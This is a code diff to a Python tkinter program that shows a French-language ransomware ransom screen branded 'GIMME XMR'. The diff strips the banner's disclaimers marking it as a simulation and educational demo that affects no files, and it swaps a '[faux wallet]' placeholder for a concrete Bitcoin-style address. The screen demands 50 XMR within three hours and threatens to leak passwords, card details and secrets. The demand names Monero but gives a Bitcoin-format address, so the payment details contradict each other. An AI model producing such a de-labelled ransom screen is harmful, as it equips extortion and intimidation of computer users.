@@ -33,12 +33,21 @@ def create_ui():
  root.resizable(False, False)
 
  ascii_banner = r"""
- _____ _____ __ __ __ __ _____ __ __ __ __ ______ / ___ \ (_ _) \ \ / / \ \ / / / ___/ (_ \ / _) \ \ / / ( __ \ / / \_) | | () \/ () () \/ () ( (__ \ \_/ / () \/ () ) (__) ) ( ( ____ | | / _ _ \ / _ _ \ ) __) \ / / _ _ \ ( __/ ( ( (__ ) | | / / \/ \ \ / / \/ \ \ ( ( / _ \ / / \/ \ \ ) \ \ _ \ \__/ / _| |__ /_/ \_\ /_/ \_\ \ \___ _/ / \ \_ /_/ \_\ ( ( \ \_)) \____/ /_____( (/ \) (/ \) )_) \__/ ┌──────────────────────────────────────────────┐ │ │ │ G I M M E X M R │ │ │ │ >> SYSTEM LOCKED - DEMO << │ │ >> NO FILES ACTUALLY AFFECTED << │ │ │ └──────────────────────────────────────────────┘ [ INIT STATUS : SIMULATION MODE ] [ ACCESS : RESTRICTED ] [ ACTION : EDUCATIONAL DEMO ] """
+   ██████╗ ██╗███╗   ███╗███╗   ███╗███████╗
+  ██╔════╝ ██║████╗ ████║████╗ ████║██╔════╝
+  ██║  ███╗██║██╔████╔██║██╔████╔██║█████╗  
+  ██║   ██║██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  
+  ╚██████╔╝██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗
+   ╚═════╝ ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝
+
+           ╔══════════════════════╗
+           ║     GIMME - XMR      ║
+           ╚══════════════════════╝"""
 
  banner = tk.Label(
  root,
  text=ascii_banner,
- font=("Consolas", 9),
+ font=("Consolas", 10),
  fg="#00ff88",
  bg="#0f0f0f",
  justify="left"
@@ -56,14 +65,18 @@ def create_ui():
 
  desc = tk.Label(
  root,
- text="💣 Vos fichiers sont cryptés ! 💣\n" 
+ text="Vos fichiers sont cryptés !\n" 
  "Bonjour, votre ordinateur a été infecté. Tous vos fichiers sont verrouillés, il n'y a aucun moyen de faire quoi que ce soit par vous-même.\n" 
- "Je vous invite à coopérer afin de récupérer vos données. Vous avez 3 heures pour verser 50 XMR à l'adresse suivante : [faux wallet].\n" 
- "Attention, arrêter puis redémarrer le PC est inutile. Au bout de ces 3 heures, toutes vos données (mots de passe, adresse carte bleue, fichiers confidentiels, ainsi que chacun de vos secrets) seront leakés sur le dark web où des gens se délecteront de vos données. Y compris moi-même.\n",
+ "\n"
+ "Je vous invite à coopérer afin de récupérer vos données. Vous avez 3 heures pour verser 50 XMR à l'adresse suivante : bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n" 
+ "\n"
+ "Attention, arrêter puis redémarrer le PC est inutile. Au bout de ces 3 heures, toutes vos données (mots de passe, adresse carte bleue, fichiers confidentiels\n"
+ "\n"
+ "ainsi que chacun de vos secrets) seront leakés sur le dark web où des gens se délecteront de vos données. Y compris moi-même.\n",
  font=("Arial", 12),
  fg="white",
  bg="#0f0f0f",
- justify="left"
+ justify="center"
  )
  desc.pack(pady=20)
 
